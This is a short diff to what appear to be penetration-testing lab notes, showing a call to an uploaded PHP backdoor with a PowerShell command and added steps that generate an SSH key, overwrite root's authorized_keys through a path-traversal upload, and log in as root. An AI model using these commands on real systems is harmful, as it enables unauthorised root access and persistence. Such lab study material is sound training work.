@@ -59,6 +59,9 @@ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-
 
 ### If can't execute uploaded file, try overwriting file
 ```
+ssh-keygen
+filename: fileup
+cat fileup > authorized_keys
 upload ../../../../../../../root/.ssh/authorized_keys
 rm ~/.ssh/known_hosts
 ssh -p 2222 -i privatekey root@mountaindesserts.com
